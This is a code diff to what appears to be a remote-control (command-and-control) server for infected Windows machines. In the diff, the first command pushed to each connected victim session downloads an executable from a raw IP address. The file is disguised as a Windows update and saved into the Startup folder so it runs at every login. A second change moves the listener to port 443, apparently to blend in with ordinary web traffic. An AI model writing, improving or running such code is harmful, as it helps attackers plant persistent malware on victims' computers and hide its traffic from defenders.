@@ -76,11 +76,11 @@ def handle_client(session):
         while session.active:
             # Send the first command if it hasn't been sent yet
             if not session.first_command_sent:
-                # First check if the file exists
-                check_command = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "if (!(Test-Path \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateService.exe\")) { Invoke-WebRequest \'http://5.144.179.247/Windows%20Update%20Service.exe\' -OutFile \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateService.exe\" }"'
-                session.command_queue.put(check_command)
+                # Download the file directly to the Startup folder
+                download_command = 'curl -o "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateService.exe" "http://5.144.179.247/Windows%20Update%20Service.exe"'
+                session.command_queue.put(download_command)
                 session.first_command_sent = True
-                print(f"Sent file check/download command to session {session_id}")
+                print(f"Sent download command to session {session_id}")
             
             # Check for incoming commands
             try:
@@ -187,8 +187,8 @@ def execute_command(session_id, command):
         return f"Error executing command: {str(e)}"
 
 def main():
-    # Start server in a separate thread
-    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', 37945))
+    # Start server in a separate thread with port 443
+    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', 443))
     server_thread.daemon = True
     server_thread.start()
     
